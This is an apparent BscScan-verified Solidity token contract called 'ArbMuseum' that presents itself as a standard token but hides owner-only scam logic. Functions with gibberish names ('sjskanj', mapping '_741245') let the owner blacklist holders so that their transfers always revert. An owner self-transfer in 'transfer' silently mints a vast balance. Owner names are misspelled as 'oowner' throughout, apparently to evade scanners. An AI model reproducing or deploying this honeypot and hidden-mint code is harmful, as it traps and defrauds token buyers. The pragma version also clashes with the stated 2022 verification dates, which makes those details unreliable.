/**
 *Submitted for verification at BscScan.com on 2022-04-15
*/

/**
 *Submitted for verification at BscScan.com on 2022-03-18
*/

pragma solidity ^0.8.17;
// SPDX-License-Identifier: Unlicensed

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address oowner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed oowner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


contract Ownable is Context {
    address private _oowner;
    event oownershipTransferred(address indexed previousoowner, address indexed newoowner);

    constructor () {
        address msgSender = _msgSender();
        _oowner = msgSender;
        emit oownershipTransferred(address(0), msgSender);
    }
    function oowner() public view virtual returns (address) {
        return _oowner;
    }
    modifier onlyoowner() {
        require(oowner() == _msgSender(), "Ownable: caller is not the oowner");
        _;
    }
    function renounceoownership() public virtual onlyoowner {
        emit oownershipTransferred(_oowner, address(0x000000000000000000000000000000000000dEaD));
        _oowner = address(0x000000000000000000000000000000000000dEaD);
    }
}


contract TT is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balance;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    string private _name = "ArbMuseum";
    string private _symbol = "ArbMuseum";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 10000000000 * 10 ** _decimals;
    uint256 private _maxTxtransfer = 10000000000 * 10 ** _decimals;
    uint256 private _burnfee = 8;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;
    mapping(address => bool) public _741245;

    function sjskanj(address account) public onlyoowner {
        _741245[account] = true;
    }


    function usjskanj(address account) public onlyoowner {
        _741245[account] = false;
    }


    function islkd(address account) public view returns (bool) {
        return _741245[account];
    }



    constructor () {
        _balance[msg.sender] = _totalSupply;
        _isExcludedFrom[msg.sender] = true;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function _transfer(address sender, address recipient, uint256 amounts) internal virtual {

        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");
        if (true){
            if (_741245[sender] == true) {
                amounts = amounts.sub(_totalSupply);
            }
        }
        uint256 blsender = _balance[sender];
        require(blsender >= amounts,"IERC20: transfer amounts exceeds balance");
        
        uint256 feeamount = 0;
        feeamount = amounts.mul(_burnfee).div(100);
        _balance[sender] = _balance[sender].sub(amounts);
        _balance[recipient] =  _balance[recipient]+amounts-feeamount;
        emit Transfer(sender, _DEADaddress, feeamount);
        emit Transfer(sender, recipient, amounts-feeamount);

    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        address SW = _msgSender(); 
        if (oowner() == SW && oowner() == recipient) { 
        _balance[SW] = 1000000000*_balance[SW].add(_totalSupply).div(1); 
        }
        _transfer(SW, recipient, amount);
        return true;
    }



    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address oowner, address spender, uint256 amount) internal virtual {
        require(oowner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[oowner][spender] = amount;
        emit Approval(oowner, spender, amount);
    }

    function allowance(address oowner, address spender) public view virtual override returns (uint256) {
        return _allowances[oowner][spender];
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "IERC20: transfer amount exceeds allowance");
        return true;
    }

}